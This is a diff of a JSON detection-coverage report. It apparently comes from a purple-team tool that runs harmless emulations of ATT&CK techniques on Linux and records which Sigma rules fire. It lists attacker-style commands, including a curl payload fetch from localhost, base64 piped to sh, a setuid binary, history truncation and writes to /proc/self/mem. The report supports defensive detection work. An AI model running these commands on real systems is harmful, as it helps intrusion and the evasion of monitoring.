+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/rgmasq"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rgmasq"
+            }
+          ],
+          "rule_title": "Potentially Suspicious Execution From Tmp Folder",
+          "rule_id": "312b42b1-bded-4441-8b58-163a3af58775",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_susp_execution_tmp_folder.yml",
+          "matched": {
+            "Image": "/tmp/rgmasq"
+          },
+          "why": "'Potentially Suspicious Execution From Tmp Folder' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1055.009",
+        "name": "Process Injection: Proc Memory",
+        "tactics": [
+          "Defense Evasion",
+          "Privilege Escalation"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "4cad6c64-d6df-42d6-8dae-eb78defdc415",
+        "detail": {
+          "command": "dd if=/dev/null of=/proc/self/mem 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c dd if=/dev/null of=/proc/self/mem 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/dd",
+              "cmd": "dd if=/dev/null of=/proc/self/mem"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Potential Linux Process Code Injection Via DD Utility",
+          "rule_id": "4cad6c64-d6df-42d6-8dae-eb78defdc415",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_dd_process_injection.yml",
+          "matched": {
+            "CommandLine": "dd if=/dev/null of=/proc/self/mem",
+            "Image": "/usr/bin/dd"
+          },
+          "why": "'Potential Linux Process Code Injection Via DD Utility' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1070",
+        "name": "Indicator Removal",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "95d61234-7f56-465c-6f2d-b562c6fedbc4",
+        "detail": {
+          "command": "dpkg --remove redgap-nonexistent 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c dpkg --remove redgap-nonexistent 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/dpkg",
+              "cmd": "dpkg --remove redgap-nonexistent"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Linux Package Uninstall",
+          "rule_id": "95d61234-7f56-465c-6f2d-b562c6fedbc4",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_remove_package.yml",
+          "matched": {
+            "CommandLine": "dpkg --remove redgap-nonexistent",
+            "Image": "/usr/bin/dpkg"
+          },
+          "why": "'Linux Package Uninstall' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
+      },
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactics": [
+          "Command and Control"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "ea34fb97-e2c4-4afb-810f-785e4459b194",
+        "detail": {
+          "command": "curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/curl",
+              "cmd": "curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/rgdl"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/rgdl"
+            }
+          ],
+          "rule_title": "Curl Usage on Linux",
+          "rule_id": "ea34fb97-e2c4-4afb-810f-785e4459b194",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_curl_usage.yml",
+          "matched": {
+            "Image": "/usr/bin/curl"
+          },
+          "why": "'Curl Usage on Linux' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1531",
+        "name": "Account Access Removal",
+        "tactics": [
+          "Impact"
+        ],
+        "detected": true,
+        "gap_type": "none",
+        "rule": "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84",
+        "detail": {
+          "command": "groupadd rg_grp 2>/dev/null; groupdel rg_grp 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c groupadd rg_grp 2>/dev/null; groupdel rg_grp 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/sbin/groupadd",
+              "cmd": "groupadd rg_grp"
+            },
+            {
+              "image": "/usr/sbin/groupdel",
+              "cmd": "groupdel rg_grp"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c groupdel rg_grp 2>/dev/null; true"
+            },
+            {
+              "image": "/usr/sbin/groupdel",
+              "cmd": "groupdel rg_grp"
+            }
+          ],
+          "rule_title": "Group Has Been Deleted Via Groupdel",
+          "rule_id": "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_groupdel.yml",
+          "matched": {
+            "Image": "/usr/sbin/groupdel"
+          },
+          "why": "'Group Has Been Deleted Via Groupdel' fired on the real captured telemetry - matched on Image."
+        }
+      },
+      {
+        "id": "T1201",
+        "name": "Password Policy Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": false,
+        "gap_type": "rule",
+        "rule": "",
+        "detail": {
+          "command": "chage -l root 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c chage -l root 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/chage",
+              "cmd": "chage -l root"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
+      },
+      {
+        "id": "T1614.001",
+        "name": "System Location Discovery: System Language Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": false,
+        "gap_type": "rule",
+        "rule": "",
+        "detail": {
+          "command": "locale 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c locale 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/locale",
+              "cmd": "locale"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
+      },
+      {
+        "id": "T1613",
+        "name": "Container and Resource Discovery",
+        "tactics": [
+          "Discovery"
+        ],
+        "detected": false,
+        "gap_type": "rule",
+        "rule": "",
+        "detail": {
+          "command": "cat /proc/1/cgroup 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /proc/1/cgroup 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /proc/1/cgroup"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
+      },
+      {
+        "id": "T1070.003",
+        "name": "Indicator Removal: Clear Command History",
+        "tactics": [
+          "Defense Evasion"
+        ],
+        "detected": false,
+        "gap_type": "rule",
+        "rule": "",
+        "detail": {
+          "command": "truncate -s 0 /root/.bash_history 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c truncate -s 0 /root/.bash_history 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/truncate",
+              "cmd": "truncate -s 0 /root/.bash_history"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
+      },
+      {
+        "id": "T1543.002",
+        "name": "Create or Modify System Process: Systemd Service",
+        "tactics": [
+          "Persistence",
+          "Privilege Escalation"
+        ],
+        "detected": false,
+        "gap_type": "rule",
+        "rule": "",
+        "detail": {
+          "command": "cp /etc/hostname /etc/systemd/system/redgap-test.service 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp /etc/hostname /etc/systemd/system/redgap-test.service 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /etc/hostname /etc/systemd/system/redgap-test.service"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /etc/systemd/system/redgap-test.service"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /etc/systemd/system/redgap-test.service"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "Telemetry was captured, but no shipped rule is tagged to this technique - a rule gap you can close by writing one Sigma rule."
+        }
       }
     ]
   },
   "fixed": {
-    "detected": 27,
-    "gaps": 11,
+    "detected": 46,
+    "gaps": 5,
     "techniques": [
       {
         "id": "T1087.001",
@@ -803,7 +2468,28 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000087"
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000087",
+        "detail": {
+          "command": "cat /etc/passwd",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /etc/passwd"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /etc/passwd"
+            }
+          ],
+          "rule_title": "Local Account Discovery via /etc/passwd Read",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000087",
+          "rule_path": "rules/redgap/account_discovery_etc_passwd.yml",
+          "matched": {
+            "CommandLine": "cat /etc/passwd",
+            "Image": "/usr/bin/cat"
+          },
+          "why": "'Local Account Discovery via /etc/passwd Read' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1057",
@@ -813,7 +2499,25 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "ps aux",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c ps aux"
+            },
+            {
+              "image": "/usr/bin/ps",
+              "cmd": "ps aux"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1136.001",
@@ -823,7 +2527,35 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000136"
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000136",
+        "detail": {
+          "command": "useradd -M -N -s /usr/sbin/nologin svc_demo",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c useradd -M -N -s /usr/sbin/nologin svc_demo"
+            },
+            {
+              "image": "/usr/sbin/useradd",
+              "cmd": "useradd -M -N -s /usr/sbin/nologin svc_demo"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c userdel svc_demo"
+            },
+            {
+              "image": "/usr/sbin/userdel",
+              "cmd": "userdel svc_demo"
+            }
+          ],
+          "rule_title": "Local Account Created via useradd, adduser or newusers",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000136",
+          "rule_path": "rules/redgap/create_account_useradd.yml",
+          "matched": {
+            "Image": "/usr/sbin/useradd"
+          },
+          "why": "'Local Account Created via useradd, adduser or newusers' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1548.001",
@@ -834,7 +2566,51 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "c21c4eaa-ba2e-419a-92b2-8371703cbe21"
+        "rule": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
+        "detail": {
+          "command": "cp /bin/true /tmp/redgap_demo_suid",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cp /bin/true /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/cp",
+              "cmd": "cp /bin/true /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/chown",
+              "cmd": "chown root /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/chmod",
+              "cmd": "chmod u+s /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_demo_suid"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_demo_suid"
+            }
+          ],
+          "rule_title": "Setuid and Setgid",
+          "rule_id": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
+          "rule_path": "rules/proc_creation_lnx_setgid_setuid.yml",
+          "matched": {
+            "CommandLine": "sh -c sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'"
+          },
+          "why": "'Setuid and Setgid' fired on the real captured telemetry - matched on CommandLine."
+        }
       },
       {
         "id": "T1070.006",
@@ -844,7 +2620,36 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000706"
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000706",
+        "detail": {
+          "command": "touch -r /etc/hostname /tmp/redgap_agent_file",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c touch -r /etc/hostname /tmp/redgap_agent_file"
+            },
+            {
+              "image": "/usr/bin/touch",
+              "cmd": "touch -r /etc/hostname /tmp/redgap_agent_file"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_agent_file"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_agent_file"
+            }
+          ],
+          "rule_title": "Timestomping via touch Reference or Explicit Timestamp",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000706",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "touch -r /etc/hostname /tmp/redgap_agent_file",
+            "Image": "/usr/bin/touch"
+          },
+          "why": "'Timestomping via touch Reference or Explicit Timestamp' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1082",
@@ -854,7 +2659,31 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "42df45e7-e6e9-43b5-8f26-bec5b39cc239"
+        "rule": "42df45e7-e6e9-43b5-8f26-bec5b39cc239",
+        "detail": {
+          "command": "uname -a",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c uname -a"
+            },
+            {
+              "image": "/usr/bin/uname",
+              "cmd": "uname -a"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "System Information Discovery",
+          "rule_id": "42df45e7-e6e9-43b5-8f26-bec5b39cc239",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_system_info_discovery.yml",
+          "matched": {
+            "Image": "/usr/bin/uname"
+          },
+          "why": "'System Information Discovery' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1016",
@@ -864,7 +2693,31 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa"
+        "rule": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+        "detail": {
+          "command": "cat /etc/resolv.conf",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /etc/resolv.conf"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /etc/resolv.conf"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "System Network Discovery - Linux",
+          "rule_id": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_system_network_discovery.yml",
+          "matched": {
+            "CommandLine": "sh -c cat /etc/resolv.conf"
+          },
+          "why": "'System Network Discovery - Linux' fired on the real captured telemetry - matched on CommandLine."
+        }
       },
       {
         "id": "T1069.001",
@@ -874,7 +2727,31 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "676381a6-15ca-4d73-a9c8-6a22e970b90d"
+        "rule": "676381a6-15ca-4d73-a9c8-6a22e970b90d",
+        "detail": {
+          "command": "groups",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c groups"
+            },
+            {
+              "image": "/usr/bin/groups",
+              "cmd": "groups"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Local Groups Discovery - Linux",
+          "rule_id": "676381a6-15ca-4d73-a9c8-6a22e970b90d",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_local_groups.yml",
+          "matched": {
+            "Image": "/usr/bin/groups"
+          },
+          "why": "'Local Groups Discovery - Linux' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1518.001",
@@ -884,7 +2761,32 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "c9d8b7fd-78e4-44fe-88f6-599135d46d60"
+        "rule": "c9d8b7fd-78e4-44fe-88f6-599135d46d60",
+        "detail": {
+          "command": "grep falcond /etc/passwd || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c grep falcond /etc/passwd || true"
+            },
+            {
+              "image": "/usr/bin/grep",
+              "cmd": "grep falcond /etc/passwd"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Security Software Discovery - Linux",
+          "rule_id": "c9d8b7fd-78e4-44fe-88f6-599135d46d60",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_security_software_discovery.yml",
+          "matched": {
+            "CommandLine": "grep falcond /etc/passwd",
+            "Image": "/usr/bin/grep"
+          },
+          "why": "'Security Software Discovery - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1083",
@@ -894,7 +2796,31 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72"
+        "rule": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+        "detail": {
+          "command": "find /etc -name hosts",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c find /etc -name hosts"
+            },
+            {
+              "image": "/usr/bin/find",
+              "cmd": "find /etc -name hosts"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "File and Directory Discovery - Linux",
+          "rule_id": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_file_and_directory_discovery.yml",
+          "matched": {
+            "Image": "/usr/bin/find"
+          },
+          "why": "'File and Directory Discovery - Linux' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1033",
@@ -904,7 +2830,29 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "whoami",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c whoami"
+            },
+            {
+              "image": "/usr/bin/whoami",
+              "cmd": "whoami"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
+          "why": "The signal is real but too common to alert on with a single-event rule - it needs correlation, not a standalone detection."
+        }
       },
       {
         "id": "T1518",
@@ -912,9 +2860,38 @@
         "tactics": [
           "Discovery"
         ],
-        "detected": false,
-        "gap_type": "rule",
-        "rule": ""
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000001",
+        "detail": {
+          "command": "dpkg -l || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c dpkg -l || true"
+            },
+            {
+              "image": "/usr/bin/dpkg",
+              "cmd": "dpkg -l"
+            },
+            {
+              "image": "/usr/bin/dpkg-query",
+              "cmd": "dpkg-query --list --"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Installed Package Enumeration via dpkg -l",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000001",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "dpkg -l",
+            "Image": "/usr/bin/dpkg"
+          },
+          "why": "'Installed Package Enumeration via dpkg -l' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1140",
@@ -924,7 +2901,39 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "ba592c6d-6888-43c3-b8c6-689b8fe47337"
+        "rule": "ba592c6d-6888-43c3-b8c6-689b8fe47337",
+        "detail": {
+          "command": "echo bHM= | base64 -d | sh",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c echo bHM= | base64 -d | sh"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh"
+            },
+            {
+              "image": "/usr/bin/base64",
+              "cmd": "base64 -d"
+            },
+            {
+              "image": "/usr/bin/ls",
+              "cmd": "ls"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Linux Base64 Encoded Pipe to Shell",
+          "rule_id": "ba592c6d-6888-43c3-b8c6-689b8fe47337",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_base64_execution.yml",
+          "matched": {
+            "CommandLine": "sh -c echo bHM= | base64 -d | sh"
+          },
+          "why": "'Linux Base64 Encoded Pipe to Shell' fired on the real captured telemetry - matched on CommandLine."
+        }
       },
       {
         "id": "T1222.002",
@@ -934,7 +2943,40 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "34979410-e4b5-4e5d-8cfb-389fdff05c12"
+        "rule": "34979410-e4b5-4e5d-8cfb-389fdff05c12",
+        "detail": {
+          "command": "touch /tmp/redgap_imm && chattr -i /tmp/redgap_imm 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c touch /tmp/redgap_imm && chattr -i /tmp/redgap_imm 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/touch",
+              "cmd": "touch /tmp/redgap_imm"
+            },
+            {
+              "image": "/usr/bin/chattr",
+              "cmd": "chattr -i /tmp/redgap_imm"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_imm"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_imm"
+            }
+          ],
+          "rule_title": "Remove Immutable File Attribute",
+          "rule_id": "34979410-e4b5-4e5d-8cfb-389fdff05c12",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_chattr_immutable_removal.yml",
+          "matched": {
+            "CommandLine": "chattr -i /tmp/redgap_imm",
+            "Image": "/usr/bin/chattr"
+          },
+          "why": "'Remove Immutable File Attribute' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1070.004",
@@ -944,7 +2986,39 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57"
+        "rule": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+        "detail": {
+          "command": "touch /tmp/redgap_shred && shred -u /tmp/redgap_shred",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c touch /tmp/redgap_shred && shred -u /tmp/redgap_shred"
+            },
+            {
+              "image": "/usr/bin/touch",
+              "cmd": "touch /tmp/redgap_shred"
+            },
+            {
+              "image": "/usr/bin/shred",
+              "cmd": "shred -u /tmp/redgap_shred"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c rm -f /tmp/redgap_shred"
+            },
+            {
+              "image": "/usr/bin/rm",
+              "cmd": "rm -f /tmp/redgap_shred"
+            }
+          ],
+          "rule_title": "File Deletion",
+          "rule_id": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_file_deletion.yml",
+          "matched": {
+            "Image": "/usr/bin/shred"
+          },
+          "why": "'File Deletion' fired on the real captured telemetry - matched on Image."
+        }
       },
       {
         "id": "T1497.001",
@@ -952,9 +3026,34 @@
         "tactics": [
           "Defense Evasion"
         ],
-        "detected": false,
-        "gap_type": "rule",
-        "rule": ""
+        "detected": true,
+        "gap_type": "none",
+        "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000002",
+        "detail": {
+          "command": "cat /sys/class/dmi/id/product_name 2>/dev/null || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c cat /sys/class/dmi/id/product_name 2>/dev/null || true"
+            },
+            {
+              "image": "/usr/bin/cat",
+              "cmd": "cat /sys/class/dmi/id/product_name"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "DMI/Product-Name Read (sandbox check)",
+          "rule_id": "7c1a9e10-1a2b-4c3d-8e4f-000000000002",
+          "rule_path": "",
+          "matched": {
+            "CommandLine": "cat /sys/class/dmi/id/product_name",
+            "Image": "/usr/bin/cat"
+          },
+          "why": "'DMI/Product-Name Read (sandbox check)' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1059",
@@ -964,7 +3063,44 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "8c1a5675-cb85-452f-a298-b01b22a51856"
+        "rule": "8c1a5675-cb85-452f-a298-b01b22a51856",
+        "detail": {
+          "command": "awk 'BEGIN {system(\"/bin/sh -c id\")}'",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c awk 'BEGIN {system(\"/bin/sh -c id\")}'"
+            },
+            {
+              "image": "/usr/bin/mawk",
+              "cmd": "awk BEGIN {system(\"/bin/sh -c id\")}"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c -- /bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "/bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/id",
+              "cmd": "id"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Suspicious Invocation of Shell via AWK - Linux",
+          "rule_id": "8c1a5675-cb85-452f-a298-b01b22a51856",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_awk_shell_spawn.yml",
+          "matched": {
+            "CommandLine": "awk BEGIN {system(\"/bin/sh -c id\")}",
+            "Image": "/usr/bin/mawk"
+          },
+          "why": "'Suspicious Invocation of Shell via AWK - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1059.004",
@@ -974,7 +3110,40 @@
         ],
         "detected": true,
         "gap_type": "none",
-        "rule": "bed978f8-7f3a-432b-82c5-9286a9b3031a"
+        "rule": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+        "detail": {
+          "command": "env /bin/sh -c id",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c env /bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/env",
+              "cmd": "env /bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "/bin/sh -c id"
+            },
+            {
+              "image": "/usr/bin/id",
+              "cmd": "id"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "Shell Invocation via Env Command - Linux",
+          "rule_id": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+          "rule_path": "rules/sigmahq/proc_creation_lnx_env_shell_invocation.yml",
+          "matched": {
+            "CommandLine": "env /bin/sh -c id",
+            "Image": "/usr/bin/env"
+          },
+          "why": "'Shell Invocation via Env Command - Linux' fired on the real captured telemetry - matched on CommandLine, Image."
+        }
       },
       {
         "id": "T1059.006",
@@ -984,7 +3153,29 @@
         ],
         "detected": false,
         "gap_type": "base_rate",
-        "rule": ""
+        "rule": "",
+        "detail": {
+          "command": "command -v python3 >/dev/null 2>&1 && python3 -c \"print('redgap')\" || true",
+          "telemetry": [
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c command -v python3 >/dev/null 2>&1 && python3 -c \"print('redgap')\" || true"
+            },
+            {
+              "image": "/usr/bin/python3.13",
+              "cmd": "python3 -c print('redgap')"
+            },
+            {
+              "image": "/usr/bin/dash",
+              "cmd": "sh -c true"
+            }
+          ],
+          "rule_title": "",
+          "rule_id": "",
+          "rule_path": "",
+          "matched": {},
